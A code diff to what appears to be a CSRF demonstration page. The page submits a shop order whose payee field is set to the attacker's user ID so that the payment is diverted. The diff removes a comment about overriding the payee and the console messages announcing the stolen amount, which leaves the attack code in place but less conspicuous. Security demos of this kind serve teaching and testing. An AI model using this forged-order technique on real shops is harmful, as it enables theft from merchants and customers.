@@ -365,7 +365,6 @@
                             image: "https://images.unsplash.com/photo-1559056199-641a0ac8b55e?w=300&h=200&fit=crop",
                             payableTo: '00000000-0000-0000-0000-000000000007', // ATTACKER'S USER ID - this is where the payment goes!
                             quantity: 1
-                            // Note: The actual Coffee Maker has payableTo: 1, but we're overriding it to 999
                         }
                     ],
                     total: 129.99,
@@ -404,11 +403,8 @@
                     success.classList.add('show');
                     
                     // Log the attack success
-                    console.log('🎯 CSRF Attack Successful!');
-                    console.log('💰 Payment diverted to user ID: 999 (attacker)');
-                    console.log('💵 Amount stolen: $129.99');
-                    console.log('📦 Order ID:', order.id);
-                    console.log('📋 Full order details:', order);
+                    console.log('Order ID:', order.id);
+                    console.log('Full order details:', order);
                 } else {
                     throw new Error('Order failed');
                 }
